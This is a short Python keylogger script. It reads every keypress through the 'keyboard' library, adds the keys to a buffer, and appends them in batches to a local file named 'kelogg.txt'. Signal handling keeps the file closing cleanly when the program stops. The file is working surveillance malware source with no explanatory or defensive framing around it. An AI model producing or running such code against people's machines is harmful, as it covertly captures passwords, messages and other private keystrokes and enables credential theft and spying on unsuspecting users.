import keyboard
import signal
import time


def keylogging():
    keys = ""
    f = open("./kelogg.txt", mode="a")
    
    try:
        while True:
            keys += keyboard.read_key() + " "
            time.sleep(0.1)
            if len(keys) > 32:
                f.writelines(keys)
                keys = ""
    finally:
        signal.signal(signal.SIGTERM, signal.SIG_IGN)
        signal.signal(signal.SIGINT, signal.SIG_IGN)
        f.close()
        signal.signal(signal.SIGTERM, signal.SIG_DFL)
        signal.signal(signal.SIGINT, signal.SIG_DFL)


if __name__ == "__main__":
    keylogging()